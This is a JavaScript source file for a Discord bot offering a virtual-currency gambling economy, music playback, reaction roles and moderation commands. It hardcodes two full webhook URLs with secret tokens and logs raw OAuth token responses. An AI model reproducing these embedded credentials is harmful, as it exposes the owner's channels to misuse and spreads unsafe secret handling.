const { Client, Events, hyperlink, ReactionEmoji, ReactionCollector, ReactionManager, ReactionUserManager, hideLinkEmbed, GatewayIntentBits, WebhookClient, EmbedBuilder, PermissionsBitField, ButtonBuilder, ButtonStyle, ActionRowBuilder, ActivityType, Activity, TextChannel, Options, Presence, Partials, Message, ChannelType, CategoryChannel, ButtonInteraction, InteractionResponse, Webhook, GuildMember, AutoModerationRule, Collection, ButtonComponent, Colors, DMChannel, MessageReaction } = require('discord.js');

const client = new Client({
    intents: [
        GatewayIntentBits.AutoModerationConfiguration,
        GatewayIntentBits.AutoModerationExecution,
        GatewayIntentBits.DirectMessageReactions,
        GatewayIntentBits.DirectMessageTyping,
        GatewayIntentBits.DirectMessages,
        GatewayIntentBits.GuildEmojisAndStickers,
        GatewayIntentBits.GuildIntegrations,
        GatewayIntentBits.GuildInvites,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessageReactions,
        GatewayIntentBits.GuildMessageTyping,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.GuildModeration,
        GatewayIntentBits.GuildPresences,
        GatewayIntentBits.GuildScheduledEvents,
        GatewayIntentBits.GuildVoiceStates,
        GatewayIntentBits.GuildWebhooks,
        GatewayIntentBits.Guilds,
        GatewayIntentBits.MessageContent,
    ],
    partials: [
        Partials.Channel,
        Partials.Message,
        Partials.Reaction,
        Partials.GuildMember,
        Partials.User
    ],
    makeCache: Options.cacheWithLimits({
        DMMessageManager: 200,
        GuildMessageManager: 200,
    }),
});

const mongoose = require('mongoose');

const config = require('./config.json');
const { default: owofify } = require('owoifyx');

const UserProfile = require('./schemas/UserProfile');

const dollarColor = 'd1dfba';
const pricelessColor = '8db6ff';
const richestColor = '7ac971';
const expensiveColor = 'ffc2f8';
const testerColor = 'ffa7a7';
const memberColor = 'ffd7a9';

const dailyAmount = 10000;

const date = new Date();
const day = date.getDate();
const month = date.getMonth() + 1;
const year = date.getFullYear();

const fs = require('node:fs');

const { createAudioResource, createAudioPlayer, NoSubscriberBehavior, joinVoiceChannel, getVoiceConnection, entersState, AudioPlayerStatus, VoiceConnectionStatus, AudioPlayer } = require('@discordjs/voice');

const player = createAudioPlayer({
    behaviors: {
        noSubscriber: NoSubscriberBehavior.Pause,
    },
});

const moderationWH = new WebhookClient({ url: 'https://discord.com/api/webhooks/1218665968386179083/6CEYHfZauB18eIW4JzEubq98WE4uxNudm2AKXjRsZCWpy_8lsZmQEDmUMm9Duk2lLerO' });

// ------------------------------------------------------------------------------------------------------------------------


const { request } = require('undici');
const express = require('express');

const app = express();

app.get('/', async ({ query }, response) => {
    const { code } = query;

    if (code) {
        try {
            const tokenResponseData = await request('https://discord.com/api/oauth2/token', {
                method: 'POST',
                body: new URLSearchParams({
                    client_id: config.clientId,
                    client_secret: config.clientSecret,
                    code,
                    grant_type: 'authorization_code',
                    redirect_uri: `https://hanafudaa.github.io/cash-bot/`,
                    scope: 'identify',
                }).toString(),
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
            });

            const oauthData = await tokenResponseData.body.json();
            console.log(oauthData);
        } catch (error) {
            // NOTE: An unauthorized token will not throw an error
            // tokenResponseData.statusCode will be 401
            console.error(error);
        }
    }

    return response.sendFile('index.html', { root: '.' });
});

app.listen(config.port, () => console.log(`App listening at https://hanafudaa.github.io/cash-bot/`));

// ------------------------------------------------------------------------------------------------------------------------

client.on('interactionCreate', async (interaction) => {

    const myGuild = client.guilds.cache.get(config.server);
    const person = `${interaction.member.user.id}`;
    if (!myGuild.members.cache.get(person)) return;
    const hasMember = (await myGuild.members.fetch(person)).roles.cache.has('1211647374196351047');
    const testerMember = (await myGuild.members.fetch(person)).roles.cache.has('1218695989523910737');
    const expensiveMember = (await myGuild.members.fetch(person)).roles.cache.has('1139696070994186363');
    const richestMember = (await myGuild.members.fetch(person)).roles.cache.has('1218721611478339715');
    const pricelessMember = (await myGuild.members.fetch(person)).roles.cache.has('1214167713073725502');
    const dollarMember = (await myGuild.members.fetch(person)).roles.cache.has('1194371950886256670');

    const confirm = new ButtonBuilder()
        .setCustomId('confirmNuke')
        .setLabel('Confirm')
        .setStyle(ButtonStyle.Danger);

    const cancel = new ButtonBuilder()
        .setCustomId('cancel')
        .setLabel('Cancel')
        .setStyle(ButtonStyle.Secondary);

    if (interaction.isButton()) {
        const intMessage = interaction.channel.messages.cache.get(interaction.message.id);
        if (interaction.component.customId == 'confirmNuke') {
            if (!interaction.guild.members.me.permissions.has(PermissionsBitField.Flags.ManageChannels)) return interaction.reply({ content: 'I don\'t have the permission: **"Manage Channels"**.', ephemeral: true });
            if (!interaction.member.permissions.has(PermissionsBitField.Flags.ManageChannels)) return interaction.reply({ content: 'You don\'t have the permission: **"Manage Channels"**.', ephemeral: true });
            const nukeChannel = interaction.guild.channels.cache.get(interaction.channel.id);
            if (nukeChannel.id == interaction.guild.publicUpdatesChannelId) return interaction.channel.send({ content: 'I can\'t nuke community update channel.' }).then(intMessage.delete()).catch((err) => console.log(err))
            if (nukeChannel.id == interaction.guild.rulesChannelId) return interaction.channel.send({ content: 'I can\'t nuke rule channel.' }).then(intMessage.delete()).catch((err) => console.log(err));
            if (nukeChannel.id == interaction.guild.safetyAlertsChannelId) return interaction.channel.send({ content: 'I can\'t nuke safety notifications channel.' }).then(intMessage.delete()).catch((err) => console.log(err));
            try {
                nukeChannel.delete();
                await nukeChannel.clone();
                const thisChannel = interaction.guild.channels.cache.find(channel => channel.name == nukeChannel.name);
                await thisChannel.send('https://tenor.com/view/will-smith-shades-mib-men-in-black-neuralyzer-gif-17328155');
            } catch (error) {
                console.log(`error handling button interaction confirm nuke - ${error}`);
            }
        }
        if (interaction.component.customId == 'cancel') {
            try {
                intMessage.delete();
            } catch (error) {
                console.log(`error cancelling interaction - ${error}`);
            }
        }
    }

    if (interaction.commandName === 'nuke') { // clones the channel and deletes the original
        if (interaction.channel.type === ChannelType.DM) return interaction.reply({ content: 'This command won\'t work here.', ephemeral: true }).catch((err) => console.error(err));
        try {
            const nukeRow = new ActionRowBuilder()
                .addComponents(cancel, confirm);

            await interaction.reply({ content: `Are you sure you want to nuke this channel?`, components: [nukeRow] });
        } catch (error) {
            console.log('error handling /nuke - ' + error)
        }
    };


    if (interaction.commandName === "Report message") {
        const msg = interaction.channel.messages.cache.get(interaction.targetMessage.id)
        if (interaction.channel.type === ChannelType.DM) return interaction.reply({ content: 'This command won\'t work here.', ephemeral: true }).catch((err) => console.error(err));
        if (msg.member.user.id == client.user.id) return interaction.reply({ content: `You cannot report me.`, ephemeral: true }).catch((err) => console.error(err));
        if (msg.member.user.id == interaction.member.id) return interaction.reply({ content: `You cannot report yourself.`, ephemeral: true }).catch((err) => console.error(err));
        try {
            const reportWH = new WebhookClient({ url: 'https://discord.com/api/webhooks/1139265242732429333/x9AYlXKZwZTAj5xZ9ZKTrWyVEcwXnac__cELa7vGPmalpN1Gv08g7QboKAFEvSrlJ6Sp' });
            const reportEmbed = new EmbedBuilder()
                .setColor(config.color)
                .addFields(
                    { name: 'Reporter', value: `${interaction.member.user.username}`, inline: true },
                    { name: 'Message link', value: `${msg.url}`, inline: true },
                    { name: 'Reported user', value: `**${msg.member.user.username}** ||${msg.member.user.id}||`, inline: true },
                    { name: 'Message content', value: `\`\`\`${msg.content}\`\`\``, inline: false })

            reportWH.send({ embeds: [reportEmbed] }).catch((err) => console.error(err));
            interaction.reply({ content: `Report has been sent.`, ephemeral: true });
        } catch (error) {
            console.log(`error handling "Report message" Message App Command ${error}`);
        }
    }

    if (interaction.commandName === "uwuify") {
        const msg = interaction.channel.messages.cache.get(interaction.targetMessage.id)
        const text = msg.content
        const owoified = owofify(`${text}`)
        interaction.reply(owoified).catch((err) => console.error(err));
    }

    if (!interaction.isChatInputCommand()) return;

    if (interaction.commandName === 'stop') {
        if (interaction.channel.type === ChannelType.DM) return interaction.reply({ content: 'This command won\'t work here.', ephemeral: true }).catch((err) => console.error(err));
        try {
            interaction.reply({ content: 'Stopping the song from playing.' });
            var getConnection = getVoiceConnection(interaction.guild.id);
            player.stop();
            getConnection.destroy();
        } catch (error) {
            console.log(`error handling /stop command ${error}`)
        }
    }

    if (interaction.commandName === 'play') {
        if (interaction.channel.type === ChannelType.DM) return interaction.reply({ content: 'This command won\'t work here.', ephemeral: true }).catch((err) => console.error(err));
        const file = interaction.options.getAttachment('file');

        try {
            let userProfile = await UserProfile.findOne({
                userid: interaction.member.id
            });

            if (!userProfile) {
                userProfile = new UserProfile({ userid: interaction.member.id });
            }

            interaction.reply({ content: `Playing **${file.name}**` });

            const fileURL = createAudioResource(`${file.proxyURL}`);

            const connection = joinVoiceChannel({
                channelId: interaction.member.voice.channel.id,
                guildId: interaction.guild.id,
                adapterCreator: interaction.guild.voiceAdapterCreator,
            });

            var getConnection = getVoiceConnection(interaction.guild.id);

            player.play(fileURL);

            const subscription = getConnection.subscribe(player);

            getConnection.on(VoiceConnectionStatus.Ready, () => {
                console.log('The connection has entered the Ready state - ready to play audio!');
            });

            player.on(AudioPlayerStatus.Playing, (oldState, newState) => {
                console.log('Audio player is in the Playing state!');
            });

            player.on(AudioPlayerStatus.Idle, (oldState, newState) => {
                console.log('Audio player is in the idle state!');
                player.stop();
                if (connection !== null) return getConnection.destroy();
            });
        } catch (error) {
            console.log(`error handling /play command ${error}`)
        }
    }

    if (interaction.commandName === 'transfer') {
        if (interaction.channel.type === ChannelType.DM) return interaction.reply({ content: 'This command won\'t work here.', ephemeral: true }).catch((err) => console.error(err));
        const user = interaction.options.get('user').user;
        const amount = interaction.options.getNumber('amount');

        let userProfile = await UserProfile.findOne({
            userid: user.id,
        });

        if (!userProfile) {
            userProfile = new UserProfile({
                userid: user.id,
            });
        }

        let AuthorUser = await UserProfile.findOne({
            userid: interaction.user.id,
        });

        if (!AuthorUser) {
            AuthorUser = new UserProfile({
                userid: interaction.user.id,
            });
        }

        if (user.bot) return interaction.reply({ content: 'You can\'t transfer your money to a bot', ephemeral: true });

        if (amount > AuthorUser.balance) {
            interaction.reply({ content: `You don't have enough money to transfer this much.`, ephemeral: true });
            return;
        }

        if (amount <= 0) return interaction.reply({ content: 'Please enter an amount greater than zero', ephemeral: true });

        try {
            AuthorUser.balance -= amount;
            userProfile.balance += amount;
            await AuthorUser.save();
            await userProfile.save();

            var formattedAmount = amount.toLocaleString("en-US");

            return interaction.reply(`# TRANSFER\nSuccessfully transferred **¥${formattedAmount}** to **${user.displayName}**`)

        } catch (error) {
            console.log('error handling /transfer command ' + error);
        }
    }

    if (interaction.commandName === 'owoify') {
        const text = interaction.options.getString('text');
        const owoified = owofify(`${text}`)
        interaction.reply(owoified).catch((err) => console.error(err));
    }

    if (interaction.commandName === 'profile') { // depending on what rank they have the get a special color for each embed message command they create using cash
        try {


        } catch (err) {
            console.log('error handling /profile - ' + err);
        }
    }

    if (interaction.commandName === 'help') {
        interaction.reply({ content: `*Go to* **[website](https://hanafudaa.github.io/cash-bot/)** to seek __information__ on **cash**.`, ephemeral: true }).catch((err) => console.log(err));
    }

    if (interaction.commandName === '50-50') {
        if (interaction.channel.type === ChannelType.DM) return interaction.reply({ content: 'This command won\'t work here.', ephemeral: true }).catch((err) => console.error(err));
        const amount = interaction.options.getNumber('amount');
        const amountWon = Number((amount * (Math.floor(1) + 0.5)).toFixed(0));

        try {
            if (amount < 50) {
                interaction.reply({ content: 'You must gamble atleast **¥50**', ephemeral: true });
                return;
            }

            let userProfile = await UserProfile.findOne({
                userid: interaction.user.id,
            });

            if (!userProfile) {
                userProfile = new UserProfile({
                    userid: interaction.user.id,
                });
            }

            if (amount > userProfile.balance) {
                interaction.reply({ content: `You don't have enough money to gamble this much.`, ephemeral: true });
                return;
            }

            const didWin = Math.random() > 0.50; // 50% chance to win

            if (!didWin) {
                userProfile.balance -= amount;
                await userProfile.save();

                var formattedAmount = amount.toLocaleString("en-US");

                const no50 = new EmbedBuilder()
                    .setDescription(`# 50/50\nYou lost, **-¥${formattedAmount}**. __Unlucky!__`)
                    if (dollarMember) {
                        no50.setColor(dollarColor)
                    } else {
                        if (pricelessMember) {
                            no50.setColor(pricelessColor)
                        } else {
                            if (richestMember) {
                                no50.setColor(richestColor)
                            } else {
                                if (expensiveMember) {
                                    no50.setColor(expensiveColor)
                                } else {
                                    if (testerMember) {
                                        no50.setColor(testerColor)
                                    } else {
                                        if (hasMember) {
                                            no50.setColor(memberColor)
                                        }
                                    }
                                }
                            }
                        }
                    }
                interaction.reply({ embeds: [no50] });
                return;
            }

            userProfile.balance += amountWon;
            await userProfile.save();

            var formattedAmount = amount.toLocaleString("en-US");
            var formattedAmountWon = amountWon.toLocaleString("en-US");

            const yes50 = new EmbedBuilder()
                .setDescription(`# 50/50\nYou won, **+¥${formattedAmountWon}**. __Lucky!__`)
                if (dollarMember) {
                    yes50.setColor(dollarColor)
                } else {
                    if (pricelessMember) {
                        yes50.setColor(pricelessColor)
                    } else {
                        if (richestMember) {
                            yes50.setColor(richestColor)
                        } else {
                            if (expensiveMember) {
                                yes50.setColor(expensiveColor)
                            } else {
                                if (testerMember) {
                                    yes50.setColor(testerColor)
                                } else {
                                    if (hasMember) {
                                        yes50.setColor(memberColor)
                                    }
                                }
                            }
                        }
                    }
                }
            interaction.reply({ embeds: [yes50] });
        } catch (err) {
            console.log('error handling /50-50 - ' + err);
        }
    }

    if (interaction.commandName === 'deal-with-the-devil') {
        try {

            let userProfile = await UserProfile.findOne({
                userid: interaction.user.id,
            });

            if (!userProfile) {
                userProfile = new UserProfile({
                    userid: interaction.user.id,
                });
            }

            if (userProfile.balance < 50) {
                interaction.reply({ content: 'You must have atleast **¥50**' })
                return;
            }

            const didWin = Math.random() > 0.66; // 33% chance to win

            if (!didWin) {
                userProfile.balance /= 3;
                await userProfile.save();

                const lostDeal = new EmbedBuilder()
                    .setDescription(`# DEAL WITH THE DEVIL \nYou now have a third of the money that you started with.`)
                    .setColor('Red')
                interaction.reply({ embeds: [lostDeal] });
                return;
            }

            userProfile.balance *= 5;
            await userProfile.save();

            const wonDeal = new EmbedBuilder()
                .setDescription(`# DEAL WITH THE DEVIL\nYou won **5x** your money!`)
                .setColor('Red')
            interaction.reply({ embeds: [wonDeal] });
        } catch (err) {
            console.log('error handling /deal-with-the-devil - ' + err);
        }
    }

    if (interaction.commandName === 'balance') {
        if (interaction.channel.type === ChannelType.DM) return interaction.reply({ content: 'Can\'t use command in DMs', ephemeral: true })
        const targetUserId = interaction.options.getUser('user')?.id || interaction.user.id;

        const targetMember = interaction.guild.members.cache.get(targetUserId);

        try {
            let userProfile = await UserProfile.findOne({ userid: targetUserId });

            if (!userProfile) {
                userProfile = new UserProfile({ userid: targetUserId });
            }

            var balanceAmount = userProfile.balance;
            var formattedBalance = balanceAmount.toLocaleString("en-US");

            const yourBalanceEmbed = new EmbedBuilder()
                .setDescription(`**${targetMember.user.displayName}'s** account balance is **¥${formattedBalance}**.`)
                if (dollarMember) {
                    yourBalanceEmbed.setColor(dollarColor)
                } else {
                    if (pricelessMember) {
                        yourBalanceEmbed.setColor(pricelessColor)
                    } else {
                        if (richestMember) {
                            yourBalanceEmbed.setColor(richestColor)
                        } else {
                            if (expensiveMember) {
                                yourBalanceEmbed.setColor(expensiveColor)
                            } else {
                                if (testerMember) {
                                    yourBalanceEmbed.setColor(testerColor)
                                } else {
                                    if (hasMember) {
                                        yourBalanceEmbed.setColor(memberColor)
                                    }
                                }
                            }
                        }
                    }
                }

            const myBalanceEmbed = new EmbedBuilder()
                .setDescription(`<@${interaction.user.id}> account balance is **¥${formattedBalance}**.`)
                if (dollarMember) {
                    myBalanceEmbed.setColor(dollarColor)
                } else {
                    if (pricelessMember) {
                        myBalanceEmbed.setColor(pricelessColor)
                    } else {
                        if (richestMember) {
                            myBalanceEmbed.setColor(richestColor)
                        } else {
                            if (expensiveMember) {
                                myBalanceEmbed.setColor(expensiveColor)
                            } else {
                                if (testerMember) {
                                    myBalanceEmbed.setColor(testerColor)
                                } else {
                                    if (hasMember) {
                                        myBalanceEmbed.setColor(memberColor)
                                    }
                                }
                            }
                        }
                    }
                }
        
            if (targetMember.user.id === client.user.id) return interaction.reply({ embeds: [yourBalanceEmbed] });
            if (targetMember.user.bot) return interaction.reply({ content: 'You can\'t see a bot\'s balance', ephemeral: true });

            if (targetUserId === interaction.user.id) {
                interaction.reply({ embeds: [myBalanceEmbed] });
            } else {
                interaction.reply({ embeds: [yourBalanceEmbed] });
            }
        } catch (error) {
            console.log(`error handling /balance: ${error}`);
        }
    }

    if (interaction.commandName === 'daily') {
        if (interaction.channel.type === ChannelType.DM) return interaction.reply({ content: 'This command won\'t work here.', ephemeral: true }).catch((err) => console.error(err));
        try {

            let userProfile = await UserProfile.findOne({
                userid: interaction.member.id,
            });

            if (userProfile) {
                const lastDailyDate = userProfile.lastDailyCollected?.toDateString();
                const currenDate = new Date().toDateString();

                if (lastDailyDate === currenDate) {
                    interaction.reply({ content: 'You have already claimed your daily reward for today. Try again tomorrow.', ephemeral: true }).catch((err) => console.error(err));
                    return;
                }
            } else {
                userProfile = new UserProfile({
                    userid: interaction.member.id,
                });
            }

            userProfile.balance += dailyAmount;
            userProfile.lastDailyCollected = new Date();

            await userProfile.save();

            var formattedDailyAmount = dailyAmount.toLocaleString("en-US");

            interaction.reply({ content: `You claimed **¥${formattedDailyAmount}** from daily reward!`, ephemeral: true });
        } catch (error) {
            console.log(`error handling /daily: ${error}`);
        }
    }

    if (interaction.commandName === 'avatar') {
        if (interaction.channel.type === ChannelType.DM) return interaction.reply({ content: 'This command won\'t work here.', ephemeral: true }).catch((err) => console.error(err));
        const avataruser = interaction.options.get('user').user;
        const avatarEmbed = new EmbedBuilder()
            .setTitle(`${avataruser.displayName}'s avatar`)
            .setImage(`https://cdn.discordapp.com/avatars/${avataruser.id}/${avataruser.avatar}.png?size=1024`)
        if (dollarMember) {
            avatarEmbed.setColor(dollarColor)
        } else {
            if (pricelessMember) {
                avatarEmbed.setColor(pricelessColor)
            } else {
                if (richestMember) {
                    avatarEmbed.setColor(richestColor)
                } else {
                    if (expensiveMember) {
                        avatarEmbed.setColor(expensiveColor)
                    } else {
                        if (testerMember) {
                            avatarEmbed.setColor(testerColor)
                        } else {
                            if (hasMember) {
                                avatarEmbed.setColor(memberColor)
                            }
                        }
                    }
                }
            }
        }

        interaction.reply({ embeds: [avatarEmbed] }).catch((err) => console.error(err));
    }

    if (interaction.commandName === 'ban') {
        if (interaction.channel.type === ChannelType.DM) return interaction.reply({ content: 'This command won\'t work here.', ephemeral: true }).catch((err) => console.error(err));
        if (!interaction.guild.members.me.permissions.has(PermissionsBitField.Flags.BanMembers)) return interaction.reply({ content: 'I don\'t have the permission: **"Ban Members"**.', ephemeral: true }).catch((err) => console.error(err));
        const user = interaction.options.get('user').user;
        const reason = interaction.options.getString('reason');
        const banMember = interaction.guild.members.cache.get(user.id);
        if (interaction.member.id == user.id) return interaction.reply({ content: 'You can\'t ban yourself.', ephemeral: true }).catch((err) => console.error(err));
        if (!banMember) return interaction.reply({ content: `Member not found`, ephemeral: true }).catch((err) => console.error(err));
        if (!banMember.manageable) return interaction.reply({ content: `I can\'t manage ${user.displayName}.`, ephemeral: true }).catch((err) => console.error(err));
        if (user.id == config.clientId) return;
        if (interaction.guild.id === config.server) {
            if (!reason) return (await interaction.reply({ content: `You must provide a reason for ban.`, ephemeral: true }));
            await moderationWH.send({ content: `**${banMember.user.username}** was banned by <@${interaction.member.id}>\n## reason:\n"${reason}".` }).catch((err) => console.log(err));
        }
        await banMember.ban({ reason: `${reason}` }).then(interaction.reply({
            content: `${banMember.user.username} was banned.`
        })).catch((err) => console.log(err));
    }

    if (interaction.commandName === 'kick') {
        if (interaction.channel.type === ChannelType.DM) return interaction.reply({ content: 'This command won\'t work here.', ephemeral: true }).catch((err) => console.error(err));
        if (!interaction.guild.members.me.permissions.has(PermissionsBitField.Flags.KickMembers)) return interaction.reply({ content: 'I don\'t have the permission: **"Kick Members"**.', ephemeral: true }).catch((err) => console.error(err));
        const user = interaction.options.get('user').user;
        const reason = interaction.options.getString('reason');
        const kickMember = interaction.guild.members.cache.get(user.id);
        if (interaction.member.id == user.id) return interaction.reply({ content: 'You can\'t kick yourself.', ephemeral: true }).catch((err) => console.error(err));
        if (!kickMember) return interaction.reply({ content: `Member not found`, ephemeral: true }).catch((err) => console.error(err));
        if (!kickMember.manageable) return interaction.reply({ content: `I can\'t manage ${user.displayName}.`, ephemeral: true }).catch((err) => console.error(err));
        if (user.id == config.clientId) return;
        if (interaction.guild.id === config.server) {
            if (!reason) return (await interaction.reply({ content: `You must provide a reason for kick.`, ephemeral: true }));
            await moderationWH.send({ content: `**${kickMember.user.username}** was kicked by <@${interaction.member.id}>\n## reason:\n"${reason}".` }).catch((err) => console.log(err));
        }
        await kickMember.kick({ reason: `${reason}` }).then(interaction.reply({
            content: `${kickMember.user.username} was kicked.`
        })).catch((err) => console.log(err));
    }

    if (interaction.commandName === 'softban') {
        if (interaction.channel.type === ChannelType.DM) return interaction.reply({ content: 'This command won\'t work here.', ephemeral: true }).catch((err) => console.error(err));
        if (!interaction.guild.members.me.permissions.has(PermissionsBitField.Flags.BanMembers)) return interaction.reply({ content: 'I don\'t have the permission: **"Ban Members"**.', ephemeral: true }).catch((err) => console.error(err));
        const user = interaction.options.get('member').user;
        const reason = interaction.options.getString('reason');
        const banMember = interaction.guild.members.cache.get(user.id);
        if (interaction.member.id == user.id) return interaction.reply({ content: 'You can\'t ban yourself.', ephemeral: true }).catch((err) => console.error(err));
        if (!banMember) return interaction.reply({ content: `Member not found`, ephemeral: true }).catch((err) => console.error(err));
        if (!banMember.manageable) return interaction.reply({ content: `I can\'t manage ${user.displayName}.`, ephemeral: true }).catch((err) => console.error(err));
        if (user.id == config.clientId) return;
        if (interaction.guild.id === config.server) {
            if (!reason) return (await interaction.reply({ content: `You must provide a reason for softbanning.`, ephemeral: true }));
            await moderationWH.send({ content: `**${banMember.user.username}** was softbanned by <@${interaction.member.id}>\n## reason:\n"${reason}".` }).catch((err) => console.log(err));
        }
        await banMember.ban({ deleteMessageSeconds: 604800 }).then(banMember => interaction.guild.members.unban(banMember.id)).then(interaction.reply({
            content: `${banMember.user.username} was softbanned.`
        })).catch((err) => console.log(err));
    }

    if (interaction.commandName === 'roleveryone') {
        if (interaction.channel.type === ChannelType.DM) return interaction.reply({ content: 'This command won\'t work here.', ephemeral: true }).catch((err) => console.error(err));
        if (!interaction.guild.members.me.permissions.has(PermissionsBitField.Flags.Administrator)) return interaction.reply({ content: 'I don\'t have the permission: **"Administrator"**.', ephemeral: true }).catch((err) => console.error(err));
        const role = interaction.options.get('role').role;
        interaction.guild.members.cache.forEach(member => member.roles.add(role.id).catch((err) => console.log(err)));
        interaction.reply({
            content: `All members now have ${role}`,
            ephemeral: true,
        }).catch((err) => console.error(err));
    }
});

// ------------------------------------------------------------------------------------------------------------------------

client.on("messageReactionAdd", async (messageReaction, User) => {
    const guildMember = messageReaction.message.guild.members.cache.get(User.id);
    const richestRole = messageReaction.message.guild.roles.cache.get('1218721611478339715');
    const chatChannel = messageReaction.message.guild.channels.cache.get('1218664237497450606');

    if (messageReaction.message.guild.id == config.server) {
        try {
            if (messageReaction.message.id == '1218993753046646956') { // richest
                messageReaction.users.remove(User.id);

                if (guildMember.roles.cache.has(richestRole.id)) return;

                let userProfile = await UserProfile.findOne({
                    userid: User.id,
                });

                if (!userProfile) {
                    userProfile = new UserProfile({
                        userid: User.id,
                    });
                }

                if (userProfile.balance < 1000000000000) {
                    return;
                } else {
                    userProfile.balance -= 1000000000000;
                    userProfile.save();
                    await guildMember.roles.add(richestRole.id).then(chatChannel.send(`### ${User} just bought richest rank!`))
                }
            }
        } catch (err) {
            console.log('error handling richest reaction - ' + err)
        }
    }

    const thirtH = messageReaction.message.guild.roles.cache.get('1218895720883421254')

    const fiveB = messageReaction.message.guild.roles.cache.get('1212805029774229635')
    const tenB = messageReaction.message.guild.roles.cache.get('1212804387198472232')
    const teeB = messageReaction.message.guild.roles.cache.get('1218894825756299264')
    const twentB = messageReaction.message.guild.roles.cache.get('1212792247263830036')
    const thirtB = messageReaction.message.guild.roles.cache.get('1212792260744192071')

    const crewRole = messageReaction.message.guild.roles.cache.get('1212801646388715541')

    if (messageReaction.message.guild.id == '1199088499647852695') { // spider familia
        try {
            if (messageReaction.message.id == '1218906394045055006') { // marine
                messageReaction.users.remove(User.id);
                if (messageReaction.emoji.name == '💯') {
                    guildMember.roles.add(thirtH.id).catch((err) => console.log(err));
                    if (guildMember.roles.cache.has(thirtH.id)) return guildMember.roles.remove(thirtH.id).catch((err) => console.log(err));
                }
            }
            if (messageReaction.message.id == '1218906376844218400') { // pirate
                messageReaction.users.remove(User.id);
                if (messageReaction.emoji.name == '🛡️') {
                    guildMember.roles.add(fiveB.id).catch((err) => console.log(err));
                    if (guildMember.roles.cache.has(fiveB.id)) return guildMember.roles.remove(fiveB.id).catch((err) => console.log(err));
                }
                if (messageReaction.emoji.name == '⚔️') {
                    guildMember.roles.add(tenB.id).catch((err) => console.log(err));
                    if (guildMember.roles.cache.has(tenB.id)) return guildMember.roles.remove(tenB.id).catch((err) => console.log(err));
                }
                if (messageReaction.emoji.name == '👻') {
                    guildMember.roles.add(teeB.id).catch((err) => console.log(err));
                    if (guildMember.roles.cache.has(teeB.id)) return guildMember.roles.remove(teeB.id).catch((err) => console.log(err));
                }
                if (messageReaction.emoji.name == '🗿') {
                    guildMember.roles.add(twentB.id).catch((err) => console.log(err));
                    if (guildMember.roles.cache.has(twentB.id)) return guildMember.roles.remove(twentB.id).catch((err) => console.log(err));
                }
                if (messageReaction.emoji.name == '💎') {
                    guildMember.roles.add(thirtB.id).catch((err) => console.log(err));
                    if (guildMember.roles.cache.has(thirtB.id)) return guildMember.roles.remove(thirtB.id).catch((err) => console.log(err));
                }
            }
            if (messageReaction.message.id == '1218906367369285642') { // crew
                messageReaction.users.remove(User.id);
                guildMember.roles.add(crewRole.id).catch((err) => console.log(err));
                if (guildMember.roles.cache.has(crewRole.id)) return guildMember.roles.remove(crewRole).catch((err) => console.log(err));
            }
        } catch (err) {
            console.log(err)
        }
    }
});

// ------------------------------------------------------------------------------------------------------------------------

client.on('messageCreate', async (message) => {

    if (message.guildId == config.server) {
        if (message.content.includes('gg/')) {
            if (message.author.id !== config.master) {
                message.delete();
            }
        }
    }

    if (message.author.bot) return; // if a bot creates a message client will return

    if (message.content.indexOf(config.prefix) !== 0) return; // if message does not contain prefix than return

    const args = message.content.slice(config.prefix.length).trim().split(/ +/g); // removing prefix from message content
    const command = args.shift().toLowerCase(); // tolowercase meaning $PING will work / args array becomes arg1, arg2, arg3

    const oneServer = client.guilds.cache.get('1136702073400983612');
    const councilRole = oneServer.roles.cache.get('1138512076021714954');

    switch (command) {
        case 'welcome':
            if (message.author.id !== config.master) return;
            message.delete();
            const applyEmbed = new EmbedBuilder()
                .setColor(config.color)
                .setDescription('## React to gain access to the server.')
                ; (await (await message.channel.send({ embeds: [applyEmbed] })).react('🤍'))
            break;

        case 'pirate':
            if (message.author.id !== config.master) return;
            message.delete();
            const pirateEmbed = new EmbedBuilder()
                .setDescription(`## How much bounty do you have?\n**- 🛡️ 5m\n- ⚔️ 10m\n- 👻 15m\n- 🗿 20m\n- 💎 30m**`)
                .setColor('Red')
            const pirateMessage = await message.channel.send({ embeds: [pirateEmbed] });
            await pirateMessage.react('🛡️')
            await pirateMessage.react('⚔️')
            await pirateMessage.react('👻')
            await pirateMessage.react('🗿')
            await pirateMessage.react('💎')
            break;

        case 'marine':
            if (message.author.id !== config.master) return;
            message.delete();
            const marineEmbed = new EmbedBuilder()
                .setDescription(`## Do you have 30/30 honour and bounty?\n**- 💯 30/30m**`)
                .setColor('Blurple')
                ; (await message.channel.send({ embeds: [marineEmbed] })).react('💯')
            break;

        case 'crew':
            if (message.author.id !== config.master) return;
            message.delete();
            const crewEmbed = new EmbedBuilder()
                .setDescription(`## Become part of the crew!`)
                .setColor('a0d60c')
                ; (await message.channel.send({ embeds: [crewEmbed] })).react('<:1046829394263552021:1213653837873807410>')
            break;

        case 'join':
            if (message.author.id !== config.master) return;
            message.delete();
            const tojoinEmbed = new EmbedBuilder()
                .setColor(config.color)
                .setDescription(`\n# To join:\n- **You will 1v1 <@1135986663152173278>**
                \n - __First__ *to* **5**
                \n - __No__ *Race* **V4**
                \n**Play as well as you can.** __If you end up losing__ you are still able to join if they see you play well. *Upon joining you will be placed into **<@&1214324601379758110>**.*`)
                .setFooter({ text: 'React to become a tryouter.' })
                ; (await message.channel.send({ embeds: [tojoinEmbed] })).react('💨')
            break;

        case 'richest':
            if (message.author.id !== config.master) return;
            message.delete();
            const richestEmbed = new EmbedBuilder()
                .setDescription('**Would you like to buy <@&1218721611478339715> for ¥1,000,000,000,000?** ')
                .setColor(richestColor)
                ; (await message.channel.send({ embeds: [richestEmbed] })).react('✅')
            break;

        case 'info':
            if (message.author.id !== config.master) return;
            message.delete();
            const infoEmbed = new EmbedBuilder()
                .setColor('White')
                .setDescription(`# Information\n- __Rules:__
            \n - **[Terms of Service](https://discord.com/terms)**
            \n - **[Guidelines](https://discord.com/guidelines)**
            \n - **No begging, spamming or self-promo**
            \n- __Ranks:__
            \n - **<@&1214167713073725502>** *(Put \`.gg/hMKAAN6YwU\` in your status)*
            \n - **<@&1218721611478339715>** *(<#1218720242117771375>)*
            \n - **<@&1139696070994186363>** *(Boost the server)*
            \n - **<@&1218695989523910737>** *(Become a tester)*
            \n - **<@&1211647374196351047>** *(GIven when joining)*
            `)
                .setImage('https://cdn.discordapp.com/attachments/1023651956767600640/1159602377691758693/whitecat.gif')
                .setFooter({ text: `If you leave the server you lose your rank.` })
